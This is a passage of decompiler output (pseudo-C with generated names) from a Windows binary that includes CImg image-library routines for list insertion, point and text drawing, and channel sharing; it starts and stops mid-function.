    goto LABEL_114;
  }
  if ( dword_500C28 > *(_DWORD *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_500C28);
    if ( dword_500C28 == -1 )
    {
      dword_500AA8 = 0;
      dword_500AAC = 0;
      dword_500AB0 = 0;
      atexit(sub_48DC00);
      _Init_thread_footer(&dword_500C28);
    }
  }
  return &dword_500AA8;
}
// 42C02B: variable 'v81' is possibly undefined
// 42C02B: variable 'v82' is possibly undefined
// 42C02B: variable 'v83' is possibly undefined
// 42C02B: variable 'v84' is possibly undefined
// 42C03F: variable 'v7' is possibly undefined
// 42C2FD: variable 'v37' is possibly undefined
// 42C61F: variable 'v62' is possibly undefined
// 447A70: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 447ABA: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 4B17B4: using guessed type char **off_4B17B4[4];
// 4B18E0: using guessed type int dword_4B18E0[4];
// 4B1940: using guessed type int dword_4B1940[4];
// 4B19AC: using guessed type int dword_4B19AC[4];
// 4B19F4: using guessed type int dword_4B19F4[4];
// 500A78: using guessed type int dword_500A78;
// 500AA8: using guessed type int dword_500AA8;
// 500AAC: using guessed type int dword_500AAC;
// 500B0C: using guessed type int dword_500B0C[19];
// 500B58: using guessed type int dword_500B58;
// 500B60: using guessed type int dword_500B60[];
// 500B64: using guessed type int dword_500B64;
// 500C14: using guessed type __int64 qword_500C14;
// 500C1C: using guessed type int dword_500C1C;
// 500C28: using guessed type int dword_500C28;

//----- (0042C700) --------------------------------------------------------
int *__thiscall sub_42C700(int *this, unsigned int a2, int a3)
{
  int v4; // ebx
  unsigned int i; // esi
  int v7[4]; // [esp+10h] [ebp-24h] BYREF
  char v8; // [esp+20h] [ebp-14h]
  int v9; // [esp+24h] [ebp-10h]
  int v10; // [esp+30h] [ebp-4h]

  memset(v7, 0, sizeof(v7));
  v8 = 0;
  v9 = 0;
  v4 = a3;
  v10 = 0;
  if ( a3 == -1 )
    v4 = *this;
  for ( i = 0; i < a2; ++i )
    sub_42C7B0(this, (int)v7, i + v4, (int)this);
  j_j__free(0);
  return this;
}
// 42C77B: variable 'this' is possibly undefined

//----- (0042C7B0) --------------------------------------------------------
void *__thiscall sub_42C7B0(void *this, int a2, unsigned int a3, int a4)
{
  unsigned int v5; // esi
  unsigned int v6; // ecx
  unsigned int v7; // ebx
  int v8; // ebx
  int v9; // ecx
  int *v10; // eax
  void **v11; // ebx
  char *v12; // ecx
  void **v13; // ecx
  void **v14; // ecx
  char *v15; // eax
  char *v16; // esi
  int v17; // edx
  int v19; // ecx
  char pExceptionObject[16]; // [esp+10h] [ebp-24h] BYREF
  void *Block; // [esp+20h] [ebp-14h]
  int v22; // [esp+24h] [ebp-10h]
  int v23; // [esp+30h] [ebp-4h]
  unsigned int v24; // [esp+40h] [ebp+Ch]

  v5 = a3;
  v6 = *(_DWORD *)this;
  if ( a3 == -1 )
  {
    v5 = v6;
  }
  else if ( a3 > v6 )
  {
    sub_41C6D0();
    sub_41C2D0(
      (int)pExceptionObject,
      (int)"[instance(%u,%u,%p)] CImgList<%s>::insert(): Invalid insertion request of specified image (%u,%u,%u,%u,%p) at position %u.",
      v19);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AUCImgArgumentException_cimg_library__);
  }
  v7 = *((_DWORD *)this + 1);
  *(_DWORD *)this = v6 + 1;
  if ( v6 + 1 <= v7 )
  {
    v11 = 0;
  }
  else
  {
    if ( v7 )
      v8 = 2 * v7;
    else
      v8 = 16;
    *((_DWORD *)this + 1) = v8;
    v24 = v8;
    v22 = v8;
    v9 = (24 * (unsigned __int64)(unsigned int)v8) >> 32 != 0 ? -1 : 24 * v8;
    v10 = (int *)unknown_libname_86(__CFADD__(v9, 4) ? -1 : v9 + 4);
    Block = v10;
    v23 = 0;
    if ( v10 )
    {
      *v10 = v8;
      v11 = (void **)(v10 + 1);
      `eh vector constructor iterator'(
        v10 + 1,
        0x18u,
        v24,
        (void (__thiscall *)(void *))sub_4223B0,
        (void (__thiscall *)(void *))sub_421DE0);
    }
    else
    {
      v11 = 0;
    }
    v23 = -1;
  }
  v12 = (char *)*((_DWORD *)this + 2);
  if ( !v12 )
  {
    *((_DWORD *)this + 2) = v11;
    v13 = v11;
LABEL_27:
    sub_42B4F0(v13, *(char **)(a2 + 20), *(_DWORD *)a2, *(_DWORD *)(a2 + 4), *(_DWORD *)(a2 + 8), *(_DWORD *)(a2 + 12));
    return this;
  }
  if ( !v11 )
  {
    if ( v5 != *(_DWORD *)this - 1 )
    {
      memmove_0(&v12[24 * v5 + 24], &v12[24 * v5], 24 * (*(_DWORD *)this - v5) - 24);
      v12 = (char *)*((_DWORD *)this + 2);
    }
    v17 = 24 * v5;
    *(_DWORD *)&v12[v17 + 12] = 0;
    *(_DWORD *)(*((_DWORD *)this + 2) + v17 + 8) = 0;
    *(_DWORD *)(*((_DWORD *)this + 2) + v17 + 4) = 0;
    *(_DWORD *)(v17 + *((_DWORD *)this + 2)) = 0;
    *(_DWORD *)(*((_DWORD *)this + 2) + v17 + 20) = 0;
    v13 = (void **)(24 * v5 + *((_DWORD *)this + 2));
    goto LABEL_27;
  }
  if ( v5 )
    memmove(v11, v12, 24 * v5);
  if ( v5 != *(_DWORD *)this - 1 )
    memmove(&v11[6 * v5 + 6], (const void *)(24 * v5 + *((_DWORD *)this + 2)), 24 * (*(_DWORD *)this - v5) - 24);
  v14 = &v11[6 * v5];
  v14[3] = 0;
  v14[2] = 0;
  v14[1] = 0;
  *v14 = 0;
  v14[5] = 0;
  sub_42B4F0(v14, *(char **)(a2 + 20), *(_DWORD *)a2, *(_DWORD *)(a2 + 4), *(_DWORD *)(a2 + 8), *(_DWORD *)(a2 + 12));
  memset(*((void **)this + 2), 0, 24 * *(_DWORD *)this - 24);
  v15 = (char *)*((_DWORD *)this + 2);
  if ( v15 )
  {
    v16 = v15 - 4;
    v23 = 1;
    `eh vector destructor iterator'(v15, 0x18u, *((_DWORD *)v15 - 1), (void (__thiscall *)(void *))sub_421DE0);
    sub_447DEF(v16);
  }
  *((_DWORD *)this + 2) = v11;
  return this;
}
// 42CA2D: variable 'v19' is possibly undefined
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0042CA50) --------------------------------------------------------
int __userpurge sub_42CA50@<eax>(int a1@<ecx>, float a2@<xmm3>, int *a3, int a4)
{
  bool v5; // zf
  unsigned int i; // eax
  unsigned int v7; // esi
  int v8; // ecx
  unsigned int *v9; // eax
  void *v10; // ebx
  int v11; // ecx
  int *v12; // eax
  int *v13; // esi
  int v14; // ecx
  int v15; // eax
  int v16; // ecx
  int v17; // eax
  int v18; // ecx
  int v19; // eax
  int v20; // ecx
  int v21; // eax
  int v22; // ecx
  char *v23; // esi
  char v25[20]; // [esp+10h] [ebp-40h] BYREF
  void *Block; // [esp+24h] [ebp-2Ch]
  void *v27; // [esp+28h] [ebp-28h]
  unsigned int v28; // [esp+2Ch] [ebp-24h]
  int v29[2]; // [esp+30h] [ebp-20h] BYREF
  void *v30; // [esp+38h] [ebp-18h]
  float v31; // [esp+3Ch] [ebp-14h]
  int *v32; // [esp+40h] [ebp-10h]
  int v33; // [esp+4Ch] [ebp-4h]

  v31 = a2;
  v5 = *(_DWORD *)(a1 + 20) == 0;
  v32 = a3;
  if ( v5 || !*(_DWORD *)a1 || !*(_DWORD *)(a1 + 4) || !*(_DWORD *)(a1 + 8) || !*(_DWORD *)(a1 + 12) )
    return sub_42B990(a1, a3, 0);
  if ( a3[5] )
  {
    for ( i = 1; i < 2; i *= 2 )
      ;
    v7 = 16;
    if ( i > 0x10 )
      v7 = i;
    v29[1] = v7;
    v28 = v7;
    v8 = (24 * (unsigned __int64)v7) >> 32 != 0 ? -1 : 24 * v7;
    v9 = (unsigned int *)unknown_libname_86(__CFADD__(v8, 4) ? -1 : v8 + 4);
    v27 = v9;
    v33 = 2;
    if ( v9 )
    {
      v10 = v9 + 1;
      *v9 = v7;
      `eh vector constructor iterator'(
        v9 + 1,
        0x18u,
        v7,
        (void (__thiscall *)(void *))sub_4223B0,
        (void (__thiscall *)(void *))sub_421DE0);
    }
    else
    {
      v10 = 0;
    }
    v30 = v10;
    v29[0] = 2;
    sub_42B990((int)v10, (int *)a1, 1);
    sub_42B990((int)v10 + 24, v32, 1);
    v33 = 3;
    v12 = sub_422C50(v29, v31, (int)v25, v11);
    v13 = v12;
    LOBYTE(v33) = 4;
    if ( *((_BYTE *)v12 + 16) || *(_BYTE *)(a1 + 16) )
    {
      sub_4235A0((void **)a1, (char *)v12[5], *v12, v12[1], v12[2], v12[3]);
    }
    else
    {
      v14 = *v12;
      *v12 = *(_DWORD *)a1;
      v15 = *(_DWORD *)(a1 + 4);
      *(_DWORD *)a1 = v14;
      v16 = v13[1];
      v13[1] = v15;
      v17 = *(_DWORD *)(a1 + 8);
      *(_DWORD *)(a1 + 4) = v16;
      v18 = v13[2];
      v13[2] = v17;
      v19 = *(_DWORD *)(a1 + 12);
      *(_DWORD *)(a1 + 8) = v18;
      v20 = v13[3];
      v13[3] = v19;
      v21 = *(_DWORD *)(a1 + 20);
      *(_DWORD *)(a1 + 12) = v20;
      v22 = v13[5];
      v13[5] = v21;
      LOBYTE(v21) = *(_BYTE *)(a1 + 16);
      *(_DWORD *)(a1 + 20) = v22;
      LOBYTE(v22) = *((_BYTE *)v13 + 16);
      *((_BYTE *)v13 + 16) = v21;
      *(_BYTE *)(a1 + 16) = v22;
    }
    if ( !*((_BYTE *)v13 + 16) )
      j_j__free((void *)v13[5]);
    v13[3] = 0;
    v13[2] = 0;
    v13[1] = 0;
    *v13 = 0;
    *((_BYTE *)v13 + 16) = 0;
    v13[5] = 0;
    if ( !v25[16] )
      j_j__free(Block);
    v33 = -1;
    if ( v30 )
    {
      v23 = (char *)v30 - 4;
      v33 = 5;
      `eh vector destructor iterator'(v30, 0x18u, *((_DWORD *)v30 - 1), (void (__thiscall *)(void *))sub_421DE0);
      sub_447DEF(v23);
    }
  }
  return a1;
}
// 42CB69: variable 'v11' is possibly undefined
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0042CCA0) --------------------------------------------------------
unsigned int *__thiscall sub_42CCA0(unsigned int *this, unsigned int *a2, int a3)
{
  unsigned int *v3; // edi
  unsigned int *v4; // eax
  unsigned int v5; // esi
  unsigned int v6; // edi
  int v7; // ecx
  unsigned int *v8; // eax
  char *v9; // ebx
  int v10; // edi
  unsigned int v11; // esi
  _BYTE *v12; // eax
  unsigned int v13; // edx
  char v14; // cl
  char *v15; // edi
  int v16; // eax
  int v17; // edi
  unsigned int v19; // [esp+14h] [ebp-28h]
  char *v20; // [esp+24h] [ebp-18h]

  v3 = this;
  v4 = a2;
  if ( this != a2 )
  {
    v5 = *a2;
    v19 = *a2;
    if ( *a2 )
    {
      v6 = 1;
      if ( v5 <= 1 )
        goto LABEL_6;
      do
        v6 *= 2;
      while ( v5 > v6 );
      if ( v6 <= 0x10 )
LABEL_6:
        v6 = 16;
      v7 = (24 * (unsigned __int64)v6) >> 32 != 0 ? -1 : 24 * v6;
      v8 = (unsigned int *)unknown_libname_86(__CFADD__(v7, 4) ? -1 : v7 + 4);
      if ( v8 )
      {
        v9 = (char *)(v8 + 1);
        *v8 = v6;
        v20 = (char *)(v8 + 1);
        `eh vector constructor iterator'(
          v8 + 1,
          0x18u,
          v6,
          (void (__thiscall *)(void *))sub_4223B0,
          (void (__thiscall *)(void *))sub_421DE0);
        v3 = this;
        v4 = a2;
      }
      else
      {
        v3 = this;
        v9 = 0;
        v4 = a2;
        v20 = 0;
      }
    }
    else
    {
      v9 = 0;
      v20 = 0;
    }
    if ( (int)v5 <= 0 )
    {
      sub_42B390(v3, v5);
    }
    else
    {
      v10 = 0;
      do
      {
        sub_42BCD0((int)&v9[v10], (int *)(v10 + v4[2]), 0);
        v4 = a2;
        v10 += 24;
        --v5;
      }
      while ( v5 );
      v11 = v19;
      sub_42B390(this, v19);
      v12 = v9 + 16;
      v13 = v19;
      v14 = 0;
      do
      {
        v14 |= *v12;
        v12 += 24;
        --v13;
      }
      while ( v13 );
      if ( v14 )
      {
        v15 = v9 + 8;
        v16 = -8 - (_DWORD)v9;
        do
        {
          sub_42B4F0(
            (void **)&v15[v16 + this[2]],
            *((char **)v15 + 3),
            *((_DWORD *)v15 - 2),
            *((_DWORD *)v15 - 1),
            *(_DWORD *)v15,
            *((_DWORD *)v15 + 1));
          v16 = -8 - (_DWORD)v9;
          v15 += 24;
          --v11;
        }
        while ( v11 );
        v9 = v20;
        v3 = this;
      }
      else
      {
        v17 = 0;
        do
        {
          sub_423F60((int)&v9[v17], v17 + this[2]);
          v17 += 24;
          --v11;
        }
        while ( v11 );
        v3 = this;
      }
    }
    if ( v9 )
    {
      `eh vector destructor iterator'(v9, 0x18u, *((_DWORD *)v9 - 1), (void (__thiscall *)(void *))sub_421DE0);
      sub_447DEF(v9 - 4);
    }
  }
  return v3;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0042CE80) --------------------------------------------------------
int *__thiscall sub_42CE80(int *this, int a2, int a3, int a4, char *a5, float a6)
{
  int v7; // edx
  int v8; // ecx
  int v9; // eax
  char *v10; // esi
  float v11; // xmm3_4
  float v12; // xmm4_4
  _BYTE *v13; // edx
  int v14; // ecx
  char v15; // al
  int v17; // eax
  int v18; // edx
  int v19; // [esp+Ch] [ebp-1Ch]
  int v20; // [esp+14h] [ebp-14h]
  char pExceptionObject[16]; // [esp+18h] [ebp-10h] BYREF

  if ( !this[5] )
    return this;
  v7 = *this;
  if ( !*this )
    return this;
  if ( !this[1] )
    return this;
  v8 = this[2];
  if ( !v8 )
    return this;
  v9 = this[3];
  if ( !v9 )
    return this;
  if ( !a5 )
  {
    sub_41C6D0();
    sub_41C2D0(
      (int)pExceptionObject,
      (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::draw_point(): Specified color is (null).",
      v18);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AUCImgArgumentException_cimg_library__);
  }
  if ( a2 < 0 )
    return this;
  if ( a3 < 0 )
    return this;
  if ( a2 >= v7 )
    return this;
  v10 = a5;
  if ( a3 >= this[1] || v8 <= 0 )
    return this;
  v11 = fabs(a6);
  v12 = 1.0 - fmaxf(0.0, a6);
  v20 = v7 * this[1] * v8;
  v13 = (_BYTE *)(a2 + this[5] + a3 * v7);
  if ( a6 < 1.0 )
  {
    v19 = 0;
    if ( v9 > 0 )
    {
      do
      {
        v17 = (unsigned __int8)*v10++;
        ++v19;
        *v13 = (int)(float)((float)((float)v17 * v11) + (float)((float)(unsigned __int8)*v13 * v12));
        v13 += v20;
      }
      while ( v19 < this[3] );
    }
    return this;
  }
  v14 = 0;
  if ( v9 <= 0 )
    return this;
  do
  {
    v15 = *v10++;
    *v13 = v15;
    ++v14;
    v13 += v20;
  }
  while ( v14 < this[3] );
  return this;
}
// 42CFF7: variable 'v18' is possibly undefined
// 4EA230: using guessed type __int128 xmmword_4EA230;

//----- (0042D010) --------------------------------------------------------
int *__thiscall sub_42D010(int *this, int a2, int a3, const char *a4, int a5, int a6, int a7, unsigned int *a8, int a9)
{
  int *v9; // edi
  unsigned int *v10; // edx
  unsigned int v11; // ebx
  bool v12; // zf
  int v13; // eax
  int v14; // ecx
  int v15; // esi
  unsigned int v16; // edi
  int v17; // ebx
  int *v18; // eax
  void *v19; // edi
  int v20; // ecx
  int v21; // edx
  int v22; // esi
  int v23; // eax
  size_t v24; // esi
  unsigned int v25; // eax
  int *v26; // edi
  unsigned int v28; // ecx
  void *v29; // eax
  unsigned int v30; // ecx
  unsigned int v31; // eax
  signed int *v32; // ecx
  unsigned int v33; // ebx
  int v34; // eax
  unsigned int v35; // edi
  char v36; // bl
  char *v37; // esi
  char *v38; // edx
  int *v39; // eax
  int v40; // edi
  int v41; // edx
  unsigned int v42; // esi
  int v43; // edi
  int v44; // ecx
  unsigned int v45; // eax
  int v46; // [esp-8h] [ebp-8Ch]
  int v47; // [esp-4h] [ebp-88h]
  int v48; // [esp+20h] [ebp-64h] BYREF
  int v49; // [esp+24h] [ebp-60h]
  int pExceptionObject; // [esp+28h] [ebp-5Ch] BYREF
  int v51; // [esp+2Ch] [ebp-58h]
  char v52; // [esp+30h] [ebp-54h]
  void *Block; // [esp+34h] [ebp-50h]
  unsigned int v54; // [esp+38h] [ebp-4Ch]
  unsigned int v55; // [esp+3Ch] [ebp-48h]
  const char *v56; // [esp+40h] [ebp-44h]
  int v57; // [esp+44h] [ebp-40h]
  unsigned int v58; // [esp+48h] [ebp-3Ch]
  unsigned __int8 v59; // [esp+4Fh] [ebp-35h]
  int *v60; // [esp+50h] [ebp-34h]
  size_t v61; // [esp+54h] [ebp-30h]
  int *v62; // [esp+58h] [ebp-2Ch]
  int v63[3]; // [esp+5Ch] [ebp-28h] BYREF
  unsigned int v64; // [esp+68h] [ebp-1Ch]
  char v65; // [esp+6Ch] [ebp-18h]
  void *v66; // [esp+70h] [ebp-14h]
  int v67; // [esp+80h] [ebp-4h]

  v9 = this;
  v62 = this;
  v10 = a8;
  v56 = a4;
  v60 = (int *)a8;
  if ( !a4 )
    return this;
  v11 = a8[2];
  if ( !v11 )
  {
    sub_41C6D0();
    sub_41C2D0(
      (int)&pExceptionObject,
      (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::draw_text(): Empty specified font.",
      *v9);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AUCImgArgumentException_cimg_library__);
  }
  v12 = this[5] == 0;
  v58 = strlen(a4);
  if ( !v12 && *v9 && v9[1] && v9[2] && v9[3] )
  {
    v17 = a3;
    goto LABEL_32;
  }
  v13 = 0;
  v14 = 0;
  v15 = 0;
  v61 = 0;
  v16 = 0;
  if ( !v58 )
    goto LABEL_24;
  do
  {
    v59 = v56[v16];
    if ( v59 == 9 )
    {
      v14 += 4 * *(_DWORD *)(v11 + 768);
LABEL_17:
      v13 = v61;
      goto LABEL_18;
    }
    if ( v59 != 10 )
    {
      if ( v59 < (unsigned int)*v60 )
        v14 += *(_DWORD *)(v11 + 24 * v59);
      goto LABEL_17;
    }
    v13 = *(_DWORD *)(v11 + 4) + v61;
    v61 = v13;
    if ( v14 <= v15 )
      v14 = v15;
    v15 = v14;
    v14 = 0;
LABEL_18:
    ++v16;
  }
  while ( v16 < v58 );
  if ( v14 || v59 == 10 )
  {
    v13 += *(_DWORD *)(v11 + 4);
    if ( v14 <= v15 )
      v14 = v15;
    v15 = v14;
  }
LABEL_24:
  v17 = a3;
  v18 = (int *)sub_42A620((int)v62, v15 + a2, a3 + v13, 1, 1);
  v19 = (void *)v18[5];
  if ( v19 )
  {
    v20 = *v18;
    if ( *v18 )
    {
      v21 = v18[1];
      if ( v21 )
      {
        v22 = v18[2];
        if ( v22 )
        {
          v23 = v18[3];
          if ( v23 )
            memset(v19, 0, v20 * v21 * v22 * v23);
        }
      }
    }
  }
  v9 = v62;
  v10 = (unsigned int *)v60;
LABEL_32:
  v24 = a2;
  v25 = 0;
  v61 = a2;
  v55 = 0;
  if ( v58 )
  {
    while ( 1 )
    {
      v28 = (unsigned __int8)v56[v25];
      v57 = v28;
      if ( v28 == 9 )
      {
        v26 = v62;
        v24 += 4 * *(_DWORD *)(v10[2] + 768);
        v61 = v24;
      }
      else
      {
        if ( v28 == 10 )
        {
          v45 = v10[2];
          v24 = a2;
          v61 = a2;
          a3 = *(_DWORD *)(v45 + 4) + v17;
LABEL_75:
          v26 = v62;
          goto LABEL_72;
        }
        if ( v28 >= *v10 )
          goto LABEL_75;
        sub_422960(v63, v10[2] + 24 * v28);
        v67 = 0;
        v29 = v66;
        if ( v66 )
        {
          v30 = v9[3];
          v31 = v64;
          if ( v30 > v64 )
          {
            sub_423CD0((int)v63, -100, -100, 1, v30, 0, 2, 0i64, 0.0, 0.0);
            v31 = v64;
          }
          v32 = v62;
          v33 = v62[3];
          if ( v31 < v33 )
            v33 = v31;
          v34 = a5;
          v54 = v33;
          if ( a5 )
          {
            v35 = 0;
            if ( v33 )
            {
              do
              {
                v36 = *(_BYTE *)(v35 + v34);
                if ( v36 != 1 )
                {
                  sub_42D6C0(v63, &v48, v35, v35);
                  v37 = (char *)Block;
                  if ( Block )
                  {
                    if ( v48 )
                    {
                      if ( v49 )
                      {
                        if ( pExceptionObject )
                        {
                          if ( v51 )
                          {
                            v38 = (char *)Block + v48 * v49 * pExceptionObject * v51 - 1;
                            if ( v38 >= Block )
                            {
                              do
                                *v38-- *= v36;
                              while ( v38 >= v37 );
                            }
                          }
                        }
                      }
                    }
                  }
                  if ( !v52 )
                    j_j__free(v37);
                  v34 = a5;
                }
                v33 = v54;
                ++v35;
              }
              while ( v35 < v54 );
              v24 = v61;
              v32 = v62;
            }
          }
          v39 = v60;
          v40 = v57 + 256;
          v57 = v40;
          if ( v40 >= *v60 )
          {
            sub_42A950(v32, v24, a3, 0, 0, v63, *(float *)&a7);
            v24 += v63[0];
            v26 = v62;
            v29 = v66;
            v61 = v24;
          }
          else
          {
            v41 = a6;
            if ( a6 )
            {
              v42 = 0;
              if ( v33 )
              {
                v43 = v61;
                do
                {
                  sub_42D450(
                    v32,
                    v43,
                    a3,
                    (int)v32,
                    v42,
                    v43 + v63[0] - 1,
                    a3 + v63[1] - 1,
                    (int)v32,
                    v42,
                    *(_BYTE *)(v42 + v41),
                    *(float *)&a7);
                  v32 = v62;
                  ++v42;
                  v41 = a6;
                }
                while ( v42 < v33 );
                v40 = v57;
                v39 = v60;
              }
              v24 = v61;
            }
            v44 = 3 * v40;
            v26 = v62;
            sub_42D780(v62, v24, a3, v46, v47, v63, (int *)(v39[2] + 8 * v44), a7, 255.0);
            v24 += v63[0];
            v29 = v66;
            v61 = v24;
          }
        }
        else
        {
          v26 = v62;
        }
        v67 = -1;
        if ( !v65 )
          j_j__free(v29);
        v10 = (unsigned int *)v60;
      }
LABEL_72:
      v17 = a3;
      v25 = v55 + 1;
      v55 = v25;
      if ( v25 >= v58 )
        return v26;
      v9 = v62;
    }
  }
  return v62;
}
// 42D35F: variable 'v46' is possibly undefined
// 42D35F: variable 'v47' is possibly undefined

//----- (0042D450) --------------------------------------------------------
int *__thiscall sub_42D450(
        int *this,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        unsigned __int8 a10,
        float a11)
{
  int *result; // eax
  int v12; // edx
  int v13; // edx
  int v14; // esi
  int v15; // esi
  int v16; // ebx
  int v17; // eax
  int v18; // eax
  int v19; // edx
  int v20; // eax
  int v21; // eax
  int v22; // esi
  int v23; // esi
  int v24; // ecx
  int v25; // edi
  int v26; // eax
  float v27; // xmm3_4
  float v28; // xmm1_4
  int v29; // eax
  signed int v30; // edx
  float v31; // xmm4_4
  int v32; // ecx
  float v33; // xmm2_4
  int v34; // ebx
  int v35; // ebx
  int v36; // esi
  _BYTE *v37; // esi
  int v38; // ecx
  int v39; // eax
  signed int v40; // ecx
  int v41; // [esp+0h] [ebp-38h]
  int v42; // [esp+4h] [ebp-34h]
  int v43; // [esp+8h] [ebp-30h]
  int v44; // [esp+Ch] [ebp-2Ch]
  int v45; // [esp+10h] [ebp-28h]
  int v46; // [esp+14h] [ebp-24h]
  int v47; // [esp+14h] [ebp-24h]
  int v48; // [esp+18h] [ebp-20h]
  int v49; // [esp+1Ch] [ebp-1Ch]
  int v50; // [esp+20h] [ebp-18h]
  float v51; // [esp+20h] [ebp-18h]
  int v52; // [esp+24h] [ebp-14h]
  int v53; // [esp+28h] [ebp-10h]
  int v54; // [esp+28h] [ebp-10h]
  int v55; // [esp+2Ch] [ebp-Ch]
  int v56; // [esp+2Ch] [ebp-Ch]
  int v57; // [esp+30h] [ebp-8h]
  int v58; // [esp+30h] [ebp-8h]

  result = this;
  v44 = this[5];
  if ( v44 )
  {
    v50 = *this;
    if ( *this )
    {
      v49 = this[1];
      if ( v49 )
      {
        v48 = this[2];
        if ( v48 )
        {
          v57 = this[3];
          if ( v57 )
          {
            v12 = a6;
            if ( a2 < a6 )
              v12 = a2;
            v55 = v12;
            v13 = a6 ^ a2 ^ v12;
            v14 = a7;
            if ( a3 < a7 )
              v14 = a3;
            v45 = v14;
            v15 = a7 ^ a3 ^ v14;
            v16 = a9;
            if ( a5 < a9 )
              v16 = a5;
            v17 = v50 - 1;
            if ( v13 < v50 )
              v17 = v13;
            v46 = v17;
            v18 = 0;
            if ( v55 < 0 )
              v18 = v55;
            v19 = v18 + v46 - v55 + 1;
            v47 = v19;
            v20 = v49 - 1;
            if ( v15 < v49 )
              v20 = v15;
            v53 = v20;
            v21 = 0;
            if ( v45 < 0 )
              v21 = v45;
            v54 = v21 + v53 - v45 + 1;
            v22 = this[2];
            if ( v48 > 0 )
              v22 = 1;
            v52 = v22;
            v23 = *this;
            v24 = v57 - 1;
            if ( (a9 ^ a5 ^ v16) < v57 )
              v24 = a9 ^ a5 ^ v16;
            v25 = v54;
            v26 = 0;
            if ( v16 < 0 )
              v26 = v16;
            v43 = v50 - v19;
            v58 = v26 + v24 - v16 + 1;
            v27 = a11;
            v42 = v50 * (v49 - v54);
            v41 = v50 * v49 * (v48 - v52);
            v28 = fmaxf(0.0, a11);
            LODWORD(v31) = sub_41C8A0((__m128)LODWORD(a11)).m128_u32[0];
            if ( v16 < 0 )
              v16 = 0;
            v51 = v31;
            v32 = v45;
            v33 = 1.0 - v28;
            v34 = v29 * v48 * v16;
            if ( v45 < 0 )
              v32 = 0;
            v35 = v23 * (v32 + v34);
            v36 = v55;
            if ( v55 < 0 )
              v36 = 0;
            v37 = (_BYTE *)(v44 + v35 + v36);
            if ( v30 <= 0 || v54 <= 0 || v52 <= 0 || v58 <= 0 )
            {
              return this;
            }
            else
            {
              v38 = v52;
              do
              {
                v39 = 0;
                v56 = 0;
                do
                {
                  if ( v25 > 0 )
                  {
                    do
                    {
                      if ( v27 < 1.0 )
                      {
                        v40 = v30;
                        do
                        {
                          *v37 = (int)(float)((float)((float)(unsigned __int8)*v37 * v33) + (float)((float)a10 * v31));
                          ++v37;
                          --v40;
                        }
                        while ( v40 );
                        v37 += v43;
                      }
                      else
                      {
                        memset(v37, a10, v30);
                        v33 = 1.0 - v28;
                        v37 += *this;
                        v27 = a11;
                        v31 = v51;
                        v30 = v47;
                      }
                      --v25;
                    }
                    while ( v25 );
                    v39 = v56;
                    v25 = v54;
                    v38 = v52;
                  }
                  v37 += v42;
                  v56 = ++v39;
                }
                while ( v39 < v38 );
                v37 += v41;
                --v58;
              }
              while ( v58 );
              return this;
            }
          }
        }
      }
    }
  }
  return result;
}
// 42D5B2: variable 'v29' is possibly undefined
// 42D5D5: variable 'v30' is possibly undefined

//----- (0042D6C0) --------------------------------------------------------
_DWORD *__thiscall sub_42D6C0(int *this, _DWORD *a2, int a3, int a4)
{
  int v4; // ebx
  int v5; // edi
  unsigned int v6; // edx
  unsigned int v7; // edi
  unsigned int v8; // eax
  int v10; // esi
  char pExceptionObject[16]; // [esp+10h] [ebp-10h] BYREF

  v4 = this[2];
  v5 = v4 * this[1] * *this;
  v6 = a4 * v5;
  v7 = a3 * v5;
  if ( v7 > v6 || (v8 = v4 * this[1] * *this * this[3], v7 >= v8) || v6 >= v8 )
  {
    v10 = *this;
    sub_41C6D0();
    sub_41C2D0(
      (int)pExceptionObject,
      (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::get_shared_channels(): Invalid request of a shared-memory subse"
           "t (0->%u,0->%u,0->%u,%u->%u).",
      v10);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AUCImgArgumentException_cimg_library__);
  }
  sub_42B230(a2, (void *)(v7 + this[5]), *this, this[1], v4, a4 - a3 + 1, 1);
  return a2;
}

//----- (0042D780) --------------------------------------------------------
int *__thiscall sub_42D780(int *this, int a2, int a3, int a4, int a5, int *a6, int *a7, int a8, float a9)
{
  int *v9; // ebx
  bool v10; // zf
  float v11; // xmm0_4
  int v12; // ecx
  int v13; // eax
  int v14; // eax
  unsigned int v15; // edx
  unsigned int v16; // eax
  unsigned int v17; // ecx
  int v18; // eax
  int v19; // esi
  int v21; // eax
  int v22; // ebx
  int v23; // ebx
  unsigned int v24; // eax
  int v25; // eax
  int v26; // ecx
  int v27; // esi
  int v28; // edi
  int v29; // eax
  int v30; // edx
  int v31; // eax
  int v32; // esi
  int v33; // eax
  int v34; // ecx
  int v35; // edx
  bool v36; // cc
  int v37; // edx
  int v38; // edi
  unsigned __int8 *v39; // esi
  unsigned __int8 *v40; // edx
  int v41; // ebx
  __m128 v42; // xmm2
  float v43; // xmm0_4
  int v44; // eax
  _BYTE *v45; // ecx
  int v46; // eax
  _DWORD v47[2]; // [esp+18h] [ebp-70h] BYREF
  char pExceptionObject[12]; // [esp+20h] [ebp-68h] BYREF
  void *Block; // [esp+2Ch] [ebp-5Ch]
  int v50; // [esp+30h] [ebp-58h]
  int v51; // [esp+34h] [ebp-54h]
  int v52; // [esp+38h] [ebp-50h]
  int v53; // [esp+3Ch] [ebp-4Ch]
  int *v54; // [esp+40h] [ebp-48h]
  unsigned int v55; // [esp+44h] [ebp-44h]
  int *v56; // [esp+48h] [ebp-40h]
  int v57; // [esp+4Ch] [ebp-3Ch]
  unsigned int v58; // [esp+50h] [ebp-38h]
  int v59; // [esp+54h] [ebp-34h]
  int v60; // [esp+58h] [ebp-30h]
  int v61; // [esp+5Ch] [ebp-2Ch]
  int *v62; // [esp+60h] [ebp-28h]
  float v63; // [esp+64h] [ebp-24h]
  int v64; // [esp+68h] [ebp-20h]
  float v65; // [esp+6Ch] [ebp-1Ch]
